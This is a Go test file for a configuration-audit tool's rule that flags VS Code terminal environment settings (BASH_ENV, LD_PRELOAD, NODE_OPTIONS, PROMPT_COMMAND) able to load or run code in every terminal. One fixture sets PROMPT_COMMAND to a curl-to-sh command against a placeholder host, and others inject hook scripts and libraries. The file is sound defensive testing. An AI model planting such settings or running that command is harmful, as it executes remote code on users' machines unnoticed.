// Copyright the cfgaudit contributors
// SPDX-License-Identifier: Apache-2.0

package rules

import (
	"strings"
	"testing"

	"github.com/cfgaudit/cfgaudit/internal/finding"
)

func terminalEnvFindingsFor(t *testing.T, raw string, scope finding.Scope) []finding.Finding {
	t.Helper()
	tg := vscodeSettingsTarget(t, raw)
	tg.Scope = scope
	var out []finding.Finding
	for _, f := range CFG048.Check(tg) {
		if strings.HasPrefix(f.Key, "terminal.integrated.env") {
			out = append(out, f)
		}
	}
	return out
}

// #1399: terminal.integrated.env.* runs or loads code in every terminal.
func TestCFG048TerminalEnv1399(t *testing.T) {
	for _, tc := range []struct {
		raw, key, name string
		sev            finding.Severity
	}{
		{`{"terminal.integrated.env.linux": {"BASH_ENV": "./scripts/env.sh"}}`, "terminal.integrated.env.linux", "BASH_ENV", finding.Error},
		{`{"terminal.integrated.env.osx": {"ZDOTDIR": "${workspaceFolder}/.zsh"}}`, "terminal.integrated.env.osx", "ZDOTDIR", finding.Error},
		{`{"terminal.integrated.env.windows": {"NODE_OPTIONS": "--require ./hook.js"}}`, "terminal.integrated.env.windows", "NODE_OPTIONS", finding.Error},
		{`{"terminal.integrated.env.linux": {"PROMPT_COMMAND": "curl example.invalid | sh"}}`, "terminal.integrated.env.linux", "PROMPT_COMMAND", finding.Error},
		{`{"terminal.integrated.env.linux": {"ENV": "./.shrc"}}`, "terminal.integrated.env.linux", "ENV", finding.Error},
		{`{"terminal.integrated.env.linux": {"LD_PRELOAD": "./lib/hook.so"}}`, "terminal.integrated.env.linux", "LD_PRELOAD", finding.Error},
		{`{"terminal.integrated.env.linux": {"BASH_ENV": "${userHome}/.bash_env"}}`, "terminal.integrated.env.linux", "BASH_ENV", finding.Info},
		{`{"terminal.integrated.env.osx": {"ENV": "/etc/shrc"}}`, "terminal.integrated.env.osx", "ENV", finding.Info},
		{`{"terminal": {"integrated": {"env": {"linux": {"BASH_ENV": "./x.sh"}}}}}`, "terminal.integrated.env.linux", "BASH_ENV", finding.Error},
	} {
		f := terminalEnvFindingsFor(t, tc.raw, finding.ScopeProject)
		if len(f) != 1 || f[0].Key != tc.key || f[0].Severity != tc.sev || !strings.Contains(f[0].Message, tc.key+" sets "+tc.name+":") ||
			!strings.Contains(f[0].Message, "only after the workspace is trusted") {
			t.Errorf("%s: %+v", tc.raw, f)
		}
	}
	// The value is not quoted.
	if f := terminalEnvFindingsFor(t, `{"terminal.integrated.env.linux": {"PROMPT_COMMAND": "secret-marker"}}`, finding.ScopeProject); len(f) != 1 || strings.Contains(f[0].Message, "secret-marker") {
		t.Errorf("value quoted: %+v", f)
	}
	for _, raw := range []string{
		`{"terminal.integrated.env.linux": {"PATH": "${env:PATH}:./bin", "JAVA_HOME": "/opt/jdk", "NODE_OPTIONS": "--max-old-space-size=4096"}}`,
		`{"terminal.integrated.env.linux": {"PROMPT_COMMAND": ""}}`,
		`{"terminal.integrated.env.linux": "not an object"}`,
	} {
		if f := terminalEnvFindingsFor(t, raw, finding.ScopeProject); len(f) != 0 {
			t.Errorf("%s: %+v", raw, f)
		}
	}
	if f := terminalEnvFindingsFor(t, `{"terminal.integrated.env.linux": {"BASH_ENV": "./scripts/env.sh"}}`, finding.ScopeUser); len(f) != 0 {
		t.Errorf("user scope: %+v", f)
	}
}
